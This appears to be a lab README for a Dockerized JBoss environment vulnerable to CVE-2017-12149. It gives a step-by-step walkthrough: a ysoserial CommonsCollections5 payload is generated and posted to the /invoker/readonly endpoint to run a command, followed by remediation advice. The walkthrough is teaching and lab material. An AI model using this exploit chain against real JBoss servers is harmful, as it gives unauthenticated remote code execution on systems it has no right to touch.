# JBoss AS ReadOnlyAccessFilter / JMXInvokerServlet Deserialization RCE (CVE-2017-12149)

## Overview

JBoss Application Server 5.x and 6.x include an HTTP filter ReadOnlyAccessFilter mapped to /invoker/readonly or /invoker/JMXInvokerServlet. The filter deserializes arbitrary Java objects from incoming HTTP POST requests before performing authentication. An unauthenticated attacker can submit serialized Java gadget chains (e.g. CommonsCollections5 or CommonsCollections6) to execute arbitrary commands within the JVM process.

- **Service Access**: `http://localhost:8143/`
- **Default Credentials**: `Unauthenticated`
- **Docker Shortcut**: `./lab start jboss-deserialization`
- **Container Name**: `cyberlab_04_jboss_deserialization_rce`
- **RAM Footprint**: ~600M

---

## Exploitation Walkthrough

### 1. Verify Vulnerable Endpoint

```bash
curl -i -s http://localhost:8143/invoker/readonly
```

### 2. Generate Serialized Payload using ysoserial

```bash
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned_jboss' > payload.ser
```

### 3. POST Serialized Object to ReadOnly Endpoint

```bash
curl -i -X POST --data-binary @payload.ser http://localhost:8143/invoker/readonly
```

### 4. Verify File Creation

```bash
docker exec -it cyberlab_04_jboss_deserialization_rce ls -la /tmp/pwned_jboss
```

---

## Defensive Remediation & Hardening

1. Upgrade JBoss to WildFly or patch ReadOnlyAccessFilter.
2. Remove or restrict http-invoker.sar and invoker servlet mappings from web.xml.
3. Filter /invoker/* endpoints via reverse proxy or WAF.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Red Hat JBoss CVE-2017-12149 Advisory](https://access.redhat.com/security/cve/cve-2017-12149)
- [Vulhub JBoss CVE-2017-12149 Environment](https://vulhub.org/#/environments/jboss/CVE-2017-12149/)
